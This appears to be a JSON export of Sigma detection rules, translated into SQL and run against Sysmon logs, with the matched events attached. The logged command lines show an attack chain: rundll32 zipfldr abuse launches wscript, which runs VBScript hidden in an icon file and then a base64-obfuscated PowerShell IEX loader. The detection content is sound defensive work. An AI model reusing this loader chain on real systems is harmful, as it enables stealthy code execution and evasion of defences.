[{
  "title": "PowerShell Base64 Encoded IEX Cmdlet",
  "id": "88f680b8-070e-402c-ae11-d2914f2257f1",
  "description": "Detects usage of a base64 encoded \"IEX\" cmdlet in a process command line",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND ((CommandLine LIKE '%SUVYIChb%' ESCAPE '\\' OR CommandLine LIKE '%lFWCAoW%' ESCAPE '\\' OR CommandLine LIKE '%JRVggKF%' ESCAPE '\\' OR CommandLine LIKE '%aWV4IChb%' ESCAPE '\\' OR CommandLine LIKE '%lleCAoW%' ESCAPE '\\' OR CommandLine LIKE '%pZXggKF%' ESCAPE '\\' OR CommandLine LIKE '%aWV4IChOZX%' ESCAPE '\\' OR CommandLine LIKE '%lleCAoTmV3%' ESCAPE '\\' OR CommandLine LIKE '%pZXggKE5ld%' ESCAPE '\\' OR CommandLine LIKE '%SUVYIChOZX%' ESCAPE '\\' OR CommandLine LIKE '%lFWCAoTmV3%' ESCAPE '\\' OR CommandLine LIKE '%JRVggKE5ld%' ESCAPE '\\' OR CommandLine LIKE '%SUVYKF%' ESCAPE '\\' OR CommandLine LIKE '%lFWChb%' ESCAPE '\\' OR CommandLine LIKE '%JRVgoW%' ESCAPE '\\' OR CommandLine LIKE '%aWV4KF%' ESCAPE '\\' OR CommandLine LIKE '%lleChb%' ESCAPE '\\' OR CommandLine LIKE '%pZXgoW%' ESCAPE '\\' OR CommandLine LIKE '%aWV4KE5ld%' ESCAPE '\\' OR CommandLine LIKE '%lleChOZX%' ESCAPE '\\' OR CommandLine LIKE '%pZXgoTmV3%' ESCAPE '\\' OR CommandLine LIKE '%SUVYKE5ld%' ESCAPE '\\' OR CommandLine LIKE '%lFWChOZX%' ESCAPE '\\' OR CommandLine LIKE '%JRVgoTmV3%' ESCAPE '\\' OR CommandLine LIKE '%SUVYKCgn%' ESCAPE '\\' OR CommandLine LIKE '%lFWCgoJ%' ESCAPE '\\' OR CommandLine LIKE '%JRVgoKC%' ESCAPE '\\' OR CommandLine LIKE '%aWV4KCgn%' ESCAPE '\\' OR CommandLine LIKE '%lleCgoJ%' ESCAPE '\\' OR CommandLine LIKE '%pZXgoKC%' ESCAPE '\\') OR (CommandLine LIKE '%SQBFAFgAIAAoAFsA%' ESCAPE '\\' OR CommandLine LIKE '%kARQBYACAAKABbA%' ESCAPE '\\' OR CommandLine LIKE '%JAEUAWAAgACgAWw%' ESCAPE '\\' OR CommandLine LIKE '%aQBlAHgAIAAoAFsA%' ESCAPE '\\' OR CommandLine LIKE '%kAZQB4ACAAKABbA%' ESCAPE '\\' OR CommandLine LIKE '%pAGUAeAAgACgAWw%' ESCAPE '\\' OR CommandLine LIKE '%aQBlAHgAIAAoAE4AZQB3A%' ESCAPE '\\' OR CommandLine LIKE '%kAZQB4ACAAKABOAGUAdw%' ESCAPE '\\' OR CommandLine LIKE '%pAGUAeAAgACgATgBlAHcA%' ESCAPE '\\' OR CommandLine LIKE '%SQBFAFgAIAAoAE4AZQB3A%' ESCAPE '\\' OR CommandLine LIKE '%kARQBYACAAKABOAGUAdw%' ESCAPE '\\' OR CommandLine LIKE '%JAEUAWAAgACgATgBlAHcA%' ESCAPE '\\')))"
  ],
  "rule_level": "high",
  "tags": [
    "attack.execution",
    "attack.t1059.001"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 2,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "\"c:\\windows\\system32\\wscript.exe\" /E:vbs c:\\windows\\temp\\icon.ico \"powershell -exec bypass -c \"\"IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JFhYPUlFWCgoJ1snICsgW2NoYXJdMHg1MyArICd5c3RlbS5UZXh0LkVuYycgKyBbY2hhcl0weDZmICsgJ2RpbmddOjpBJyArIFtjaGFyXTB4NTMgKyAnQ0lJLkdldCcgKyBbY2hhcl0weDUzICsgJ3RyaW5nKFsnICsgW2NoYXJdMHg1MyArICd5c3RlbS5DJyArIFtjaGFyXTB4NmYgKyAnbnZlcnRdOjpGcicgKyBbY2hhcl0weDZmICsgJ21CYXNlNicgKyBbY2hhcl0weDM0ICsgJycgKyBbY2hhcl0weDUzICsgJ3RyaW5nKChnZXQtYycgKyBbY2hhcl0weDZmICsgJ250ZW50IC1wYXRoICcnYzpcd2luZCcgKyBbY2hhcl0weDZmICsgJ3dzXHRlbXBccGljdHVyZS5qcGcnJykpKScpKTskQkI9SUVYKCgnc3RhcnQtc2xlZXAgMTA7JHM9JFhYOyRkID0gQCgpOyR2ID0gMDskYyA9IDA7d2hpbGUoJGMgLW5lICRzLmxlbmd0aCl7JHY9KCR2KjUyKSsoW0ludDMyXVtjaGFyXSRzWyRjXS0nICsgW2NoYXJdMHgzNCArICcwKTtpZigoKCRjKzEpJTMpIC1lcSAwKXt3aGlsZSgkdiAtbmUgMCl7JHZ2PSR2JTI1NjtpZigkdnYgLWd0IDApeyRkKz1bY2hhcl1bSW50MzJdJHZ2fSR2PVtJbnQzMl0oJHYvMjU2KX19JGMrPTE7fTtbYXJyYXldOjpSZXZlcnNlKCRkKTtJRVgoWycgKyBbY2hhcl0weDUzICsgJ3RyaW5nXTo6SicgKyBbY2hhcl0weDZmICsgJ2luKCcnJycsJGQpKTs7JykpO0lFWCgkQkIp')))\"\"\"",
      "Company": "Microsoft Corporation",
      "Computer": "MSEDGEWIN10",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "Microsoft ® Windows Based Script Host",
      "EventID": 1,
      "EventRecordID": 10675,
      "FileVersion": "5.812.10240.16384",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "SHA1=267D05CE8D10D97620BE1C7773757668BAEB19EE,MD5=F5E5DF6C9D62F4E940B334954A2046FC,SHA256=47CACD60D91441137D055184614B1A418C0457992977857A76CA05C75BBC1B56,IMPHASH=0F71D5F6F4CBB935CE1B09754102419C",
      "IMPHASH": "0F71D5F6F4CBB935CE1B09754102419C",
      "Image": "C:\\Windows\\System32\\wscript.exe",
      "IntegrityLevel": "Medium",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "747F3D96-F419-5D53-0000-002026910200",
      "LogonId": "0x29126",
      "MD5": "F5E5DF6C9D62F4E940B334954A2046FC",
      "Opcode": 0,
      "OriginalLogfile": "sysmon_lolbas_rundll32_zipfldr_routethecall_shell.evtx",
      "ParentCommandLine": "\"C:\\Windows\\system32\\rundll32.exe\" zipfldr.dll,RouteTheCall shell:::{769f9427-3cc6-4b62-be14-2a705115b7ab}",
      "ParentImage": "C:\\Windows\\System32\\rundll32.exe",
      "ParentProcessGuid": "747F3D96-FBCA-5D53-0000-0010B8664100",
      "ParentProcessId": 2476,
      "ProcessGuid": "747F3D96-FBCA-5D53-0000-001036784100",
      "ProcessID": 2004,
      "Product": "Microsoft ® Windows Script Host",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "SHA1": "267D05CE8D10D97620BE1C7773757668BAEB19EE",
      "SHA256": "47CACD60D91441137D055184614B1A418C0457992977857A76CA05C75BBC1B56",
      "SystemTime": "2019-08-14T12:17:14.893930Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 4480,
      "User": "MSEDGEWIN10\\IEUser",
      "UserID": "S-1-5-18",
      "UtcTime": "2019-08-14 12:17:14.661",
      "Version": 5
    }
  ]
},
{
  "title": "Suspicious Script Execution From Temp Folder",
  "id": "a6a39bdb-935c-4f0a-ab77-35f4bbf44d33",
  "description": "Detects a suspicious script executions from temporary folder",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (((Image LIKE '%\\\\powershell.exe' ESCAPE '\\' OR Image LIKE '%\\\\pwsh.exe' ESCAPE '\\' OR Image LIKE '%\\\\mshta.exe' ESCAPE '\\' OR Image LIKE '%\\\\wscript.exe' ESCAPE '\\' OR Image LIKE '%\\\\cscript.exe' ESCAPE '\\') AND (CommandLine LIKE '%\\\\Windows\\\\Temp%' ESCAPE '\\' OR CommandLine LIKE '%\\\\Temporary Internet%' ESCAPE '\\' OR CommandLine LIKE '%\\\\AppData\\\\Local\\\\Temp%' ESCAPE '\\' OR CommandLine LIKE '%\\\\AppData\\\\Roaming\\\\Temp%' ESCAPE '\\' OR CommandLine LIKE '%\\%TEMP\\%%' ESCAPE '\\' OR CommandLine LIKE '%\\%TMP\\%%' ESCAPE '\\' OR CommandLine LIKE '%\\%LocalAppData\\%\\\\Temp%' ESCAPE '\\')) AND (NOT (CommandLine LIKE '% >%' ESCAPE '\\' OR CommandLine LIKE '%Out-File%' ESCAPE '\\' OR CommandLine LIKE '%ConvertTo-Json%' ESCAPE '\\' OR CommandLine LIKE '%-WindowStyle hidden -Verb runAs%' ESCAPE '\\' OR CommandLine LIKE '%\\\\Windows\\\\system32\\\\config\\\\systemprofile\\\\AppData\\\\Local\\\\Temp\\\\Amazon\\\\EC2-Windows\\\\%' ESCAPE '\\'))))"
  ],
  "rule_level": "high",
  "tags": [
    "attack.execution",
    "attack.t1059"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 2,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "\"c:\\windows\\system32\\wscript.exe\" /E:vbs c:\\windows\\temp\\icon.ico \"powershell -exec bypass -c \"\"IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JFhYPUlFWCgoJ1snICsgW2NoYXJdMHg1MyArICd5c3RlbS5UZXh0LkVuYycgKyBbY2hhcl0weDZmICsgJ2RpbmddOjpBJyArIFtjaGFyXTB4NTMgKyAnQ0lJLkdldCcgKyBbY2hhcl0weDUzICsgJ3RyaW5nKFsnICsgW2NoYXJdMHg1MyArICd5c3RlbS5DJyArIFtjaGFyXTB4NmYgKyAnbnZlcnRdOjpGcicgKyBbY2hhcl0weDZmICsgJ21CYXNlNicgKyBbY2hhcl0weDM0ICsgJycgKyBbY2hhcl0weDUzICsgJ3RyaW5nKChnZXQtYycgKyBbY2hhcl0weDZmICsgJ250ZW50IC1wYXRoICcnYzpcd2luZCcgKyBbY2hhcl0weDZmICsgJ3dzXHRlbXBccGljdHVyZS5qcGcnJykpKScpKTskQkI9SUVYKCgnc3RhcnQtc2xlZXAgMTA7JHM9JFhYOyRkID0gQCgpOyR2ID0gMDskYyA9IDA7d2hpbGUoJGMgLW5lICRzLmxlbmd0aCl7JHY9KCR2KjUyKSsoW0ludDMyXVtjaGFyXSRzWyRjXS0nICsgW2NoYXJdMHgzNCArICcwKTtpZigoKCRjKzEpJTMpIC1lcSAwKXt3aGlsZSgkdiAtbmUgMCl7JHZ2PSR2JTI1NjtpZigkdnYgLWd0IDApeyRkKz1bY2hhcl1bSW50MzJdJHZ2fSR2PVtJbnQzMl0oJHYvMjU2KX19JGMrPTE7fTtbYXJyYXldOjpSZXZlcnNlKCRkKTtJRVgoWycgKyBbY2hhcl0weDUzICsgJ3RyaW5nXTo6SicgKyBbY2hhcl0weDZmICsgJ2luKCcnJycsJGQpKTs7JykpO0lFWCgkQkIp')))\"\"\"",
      "Company": "Microsoft Corporation",
      "Computer": "MSEDGEWIN10",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "Microsoft ® Windows Based Script Host",
      "EventID": 1,
      "EventRecordID": 10675,
      "FileVersion": "5.812.10240.16384",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "SHA1=267D05CE8D10D97620BE1C7773757668BAEB19EE,MD5=F5E5DF6C9D62F4E940B334954A2046FC,SHA256=47CACD60D91441137D055184614B1A418C0457992977857A76CA05C75BBC1B56,IMPHASH=0F71D5F6F4CBB935CE1B09754102419C",
      "IMPHASH": "0F71D5F6F4CBB935CE1B09754102419C",
      "Image": "C:\\Windows\\System32\\wscript.exe",
      "IntegrityLevel": "Medium",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "747F3D96-F419-5D53-0000-002026910200",
      "LogonId": "0x29126",
      "MD5": "F5E5DF6C9D62F4E940B334954A2046FC",
      "Opcode": 0,
      "OriginalLogfile": "sysmon_lolbas_rundll32_zipfldr_routethecall_shell.evtx",
      "ParentCommandLine": "\"C:\\Windows\\system32\\rundll32.exe\" zipfldr.dll,RouteTheCall shell:::{769f9427-3cc6-4b62-be14-2a705115b7ab}",
      "ParentImage": "C:\\Windows\\System32\\rundll32.exe",
      "ParentProcessGuid": "747F3D96-FBCA-5D53-0000-0010B8664100",
      "ParentProcessId": 2476,
      "ProcessGuid": "747F3D96-FBCA-5D53-0000-001036784100",
      "ProcessID": 2004,
      "Product": "Microsoft ® Windows Script Host",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "SHA1": "267D05CE8D10D97620BE1C7773757668BAEB19EE",
      "SHA256": "47CACD60D91441137D055184614B1A418C0457992977857A76CA05C75BBC1B56",
      "SystemTime": "2019-08-14T12:17:14.893930Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 4480,
      "User": "MSEDGEWIN10\\IEUser",
      "UserID": "S-1-5-18",
      "UtcTime": "2019-08-14 12:17:14.661",
      "Version": 5
    }
  ]
},
{
  "title": "Base64 Encoded PowerShell Command Detected",
  "id": "e32d4572-9826-4738-b651-95fa63747e8a",
  "description": "Detects usage of the \"FromBase64String\" function in the commandline which is used to decode a base64 encoded string",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND CommandLine LIKE '%::FromBase64String(%' ESCAPE '\\')"
  ],
  "rule_level": "high",
  "tags": [
    "attack.t1027",
    "attack.defense-evasion",
    "attack.execution",
    "attack.t1140",
    "attack.t1059.001"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 2,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "\"c:\\windows\\system32\\wscript.exe\" /E:vbs c:\\windows\\temp\\icon.ico \"powershell -exec bypass -c \"\"IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JFhYPUlFWCgoJ1snICsgW2NoYXJdMHg1MyArICd5c3RlbS5UZXh0LkVuYycgKyBbY2hhcl0weDZmICsgJ2RpbmddOjpBJyArIFtjaGFyXTB4NTMgKyAnQ0lJLkdldCcgKyBbY2hhcl0weDUzICsgJ3RyaW5nKFsnICsgW2NoYXJdMHg1MyArICd5c3RlbS5DJyArIFtjaGFyXTB4NmYgKyAnbnZlcnRdOjpGcicgKyBbY2hhcl0weDZmICsgJ21CYXNlNicgKyBbY2hhcl0weDM0ICsgJycgKyBbY2hhcl0weDUzICsgJ3RyaW5nKChnZXQtYycgKyBbY2hhcl0weDZmICsgJ250ZW50IC1wYXRoICcnYzpcd2luZCcgKyBbY2hhcl0weDZmICsgJ3dzXHRlbXBccGljdHVyZS5qcGcnJykpKScpKTskQkI9SUVYKCgnc3RhcnQtc2xlZXAgMTA7JHM9JFhYOyRkID0gQCgpOyR2ID0gMDskYyA9IDA7d2hpbGUoJGMgLW5lICRzLmxlbmd0aCl7JHY9KCR2KjUyKSsoW0ludDMyXVtjaGFyXSRzWyRjXS0nICsgW2NoYXJdMHgzNCArICcwKTtpZigoKCRjKzEpJTMpIC1lcSAwKXt3aGlsZSgkdiAtbmUgMCl7JHZ2PSR2JTI1NjtpZigkdnYgLWd0IDApeyRkKz1bY2hhcl1bSW50MzJdJHZ2fSR2PVtJbnQzMl0oJHYvMjU2KX19JGMrPTE7fTtbYXJyYXldOjpSZXZlcnNlKCRkKTtJRVgoWycgKyBbY2hhcl0weDUzICsgJ3RyaW5nXTo6SicgKyBbY2hhcl0weDZmICsgJ2luKCcnJycsJGQpKTs7JykpO0lFWCgkQkIp')))\"\"\"",
      "Company": "Microsoft Corporation",
      "Computer": "MSEDGEWIN10",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "Microsoft ® Windows Based Script Host",
      "EventID": 1,
      "EventRecordID": 10675,
      "FileVersion": "5.812.10240.16384",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "SHA1=267D05CE8D10D97620BE1C7773757668BAEB19EE,MD5=F5E5DF6C9D62F4E940B334954A2046FC,SHA256=47CACD60D91441137D055184614B1A418C0457992977857A76CA05C75BBC1B56,IMPHASH=0F71D5F6F4CBB935CE1B09754102419C",
      "IMPHASH": "0F71D5F6F4CBB935CE1B09754102419C",
      "Image": "C:\\Windows\\System32\\wscript.exe",
      "IntegrityLevel": "Medium",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "747F3D96-F419-5D53-0000-002026910200",
      "LogonId": "0x29126",
      "MD5": "F5E5DF6C9D62F4E940B334954A2046FC",
      "Opcode": 0,
      "OriginalLogfile": "sysmon_lolbas_rundll32_zipfldr_routethecall_shell.evtx",
      "ParentCommandLine": "\"C:\\Windows\\system32\\rundll32.exe\" zipfldr.dll,RouteTheCall shell:::{769f9427-3cc6-4b62-be14-2a705115b7ab}",
      "ParentImage": "C:\\Windows\\System32\\rundll32.exe",
      "ParentProcessGuid": "747F3D96-FBCA-5D53-0000-0010B8664100",
      "ParentProcessId": 2476,
      "ProcessGuid": "747F3D96-FBCA-5D53-0000-001036784100",
      "ProcessID": 2004,
      "Product": "Microsoft ® Windows Script Host",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "SHA1": "267D05CE8D10D97620BE1C7773757668BAEB19EE",
      "SHA256": "47CACD60D91441137D055184614B1A418C0457992977857A76CA05C75BBC1B56",
      "SystemTime": "2019-08-14T12:17:14.893930Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 4480,
      "User": "MSEDGEWIN10\\IEUser",
      "UserID": "S-1-5-18",
      "UtcTime": "2019-08-14 12:17:14.661",
      "Version": 5
    }
  ]
},
{
  "title": "Potentially Suspicious Rundll32 Activity",
  "id": "e593cf51-88db-4ee1-b920-37e89012a3c9",
  "description": "Detects suspicious execution of rundll32, with specific calls to some DLLs with known LOLBIN functionalities",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (((CommandLine LIKE '%javascript:%' ESCAPE '\\' AND CommandLine LIKE '%.RegisterXLL%' ESCAPE '\\') OR (CommandLine LIKE '%url.dll%' ESCAPE '\\' AND CommandLine LIKE '%OpenURL%' ESCAPE '\\') OR (CommandLine LIKE '%url.dll%' ESCAPE '\\' AND CommandLine LIKE '%OpenURLA%' ESCAPE '\\') OR (CommandLine LIKE '%url.dll%' ESCAPE '\\' AND CommandLine LIKE '%FileProtocolHandler%' ESCAPE '\\') OR (CommandLine LIKE '%zipfldr.dll%' ESCAPE '\\' AND CommandLine LIKE '%RouteTheCall%' ESCAPE '\\') OR (CommandLine LIKE '%shell32.dll%' ESCAPE '\\' AND CommandLine LIKE '%Control\\_RunDLL%' ESCAPE '\\') OR (CommandLine LIKE '%shell32.dll%' ESCAPE '\\' AND CommandLine LIKE '%ShellExec\\_RunDLL%' ESCAPE '\\') OR (CommandLine LIKE '%mshtml.dll%' ESCAPE '\\' AND CommandLine LIKE '%PrintHTML%' ESCAPE '\\') OR (CommandLine LIKE '%advpack.dll%' ESCAPE '\\' AND CommandLine LIKE '%LaunchINFSection%' ESCAPE '\\') OR (CommandLine LIKE '%advpack.dll%' ESCAPE '\\' AND CommandLine LIKE '%RegisterOCX%' ESCAPE '\\') OR (CommandLine LIKE '%ieadvpack.dll%' ESCAPE '\\' AND CommandLine LIKE '%LaunchINFSection%' ESCAPE '\\') OR (CommandLine LIKE '%ieadvpack.dll%' ESCAPE '\\' AND CommandLine LIKE '%RegisterOCX%' ESCAPE '\\') OR (CommandLine LIKE '%ieframe.dll%' ESCAPE '\\' AND CommandLine LIKE '%OpenURL%' ESCAPE '\\') OR (CommandLine LIKE '%shdocvw.dll%' ESCAPE '\\' AND CommandLine LIKE '%OpenURL%' ESCAPE '\\') OR (CommandLine LIKE '%syssetup.dll%' ESCAPE '\\' AND CommandLine LIKE '%SetupInfObjectInstallAction%' ESCAPE '\\') OR (CommandLine LIKE '%setupapi.dll%' ESCAPE '\\' AND CommandLine LIKE '%InstallHinfSection%' ESCAPE '\\') OR (CommandLine LIKE '%pcwutl.dll%' ESCAPE '\\' AND CommandLine LIKE '%LaunchApplication%' ESCAPE '\\') OR (CommandLine LIKE '%dfshim.dll%' ESCAPE '\\' AND CommandLine LIKE '%ShOpenVerbApplication%' ESCAPE '\\') OR (CommandLine LIKE '%dfshim.dll%' ESCAPE '\\' AND CommandLine LIKE '%ShOpenVerbShortcut%' ESCAPE '\\') OR (CommandLine LIKE '%scrobj.dll%' ESCAPE '\\' AND CommandLine LIKE '%GenerateTypeLib%' ESCAPE '\\' AND CommandLine LIKE '%http%' ESCAPE '\\') OR (CommandLine LIKE '%shimgvw.dll%' ESCAPE '\\' AND CommandLine LIKE '%ImageView\\_Fullscreen%' ESCAPE '\\' AND CommandLine LIKE '%http%' ESCAPE '\\') OR (CommandLine LIKE '%comsvcs.dll%' ESCAPE '\\' AND CommandLine LIKE '%MiniDump%' ESCAPE '\\')) AND (NOT (CommandLine LIKE '%shell32.dll,Control\\_RunDLL desk.cpl,screensaver,@screensaver%' ESCAPE '\\' OR (ParentImage LIKE 'C:\\\\Windows\\\\System32\\\\control.exe' ESCAPE '\\' AND ParentCommandLine LIKE '%.cpl%' ESCAPE '\\' AND (CommandLine LIKE '%Shell32.dll%' ESCAPE '\\' AND CommandLine LIKE '%Control\\_RunDLL%' ESCAPE '\\' AND CommandLine LIKE '%.cpl%' ESCAPE '\\')) OR (ParentImage LIKE 'C:\\\\Windows\\\\System32\\\\control.exe' ESCAPE '\\' AND CommandLine LIKE '\"C:\\\\Windows\\\\system32\\\\rundll32.exe\" Shell32.dll,Control\\_RunDLL \"C:\\\\Windows\\\\System32\\\\%' ESCAPE '\\' AND CommandLine LIKE '%.cpl\",' ESCAPE '\\')))))"
  ],
  "rule_level": "medium",
  "tags": [
    "attack.defense-evasion",
    "attack.t1218.011"
  ],
  "count": 1,
  "matches": [
    {
      "row_id": 1,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "\"C:\\Windows\\system32\\rundll32.exe\" zipfldr.dll,RouteTheCall shell:::{769f9427-3cc6-4b62-be14-2a705115b7ab}",
      "Company": "Microsoft Corporation",
      "Computer": "MSEDGEWIN10",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "Windows host process (Rundll32)",
      "EventID": 1,
      "EventRecordID": 10674,
      "FileVersion": "10.0.17763.1 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "SHA1=F3BA3415DD068A8871F285570BEA2E29874CBFF1,MD5=C73BA51880F5A7FB20C84185A23212EF,SHA256=01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A,IMPHASH=F27A7FC3A53E74F45BE370131953896A",
      "IMPHASH": "F27A7FC3A53E74F45BE370131953896A",
      "Image": "C:\\Windows\\System32\\rundll32.exe",
      "IntegrityLevel": "Medium",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "747F3D96-F419-5D53-0000-002026910200",
      "LogonId": "0x29126",
      "MD5": "C73BA51880F5A7FB20C84185A23212EF",
      "Opcode": 0,
      "OriginalLogfile": "sysmon_lolbas_rundll32_zipfldr_routethecall_shell.evtx",
      "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "747F3D96-F41E-5D53-0000-001067C80300",
      "ParentProcessId": 4824,
      "ProcessGuid": "747F3D96-FBCA-5D53-0000-0010B8664100",
      "ProcessID": 2004,
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "SHA1": "F3BA3415DD068A8871F285570BEA2E29874CBFF1",
      "SHA256": "01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A",
      "SystemTime": "2019-08-14T12:17:14.614739Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 4480,
      "User": "MSEDGEWIN10\\IEUser",
      "UserID": "S-1-5-18",
      "UtcTime": "2019-08-14 12:17:14.447",
      "Version": 5
    }
  ]
}]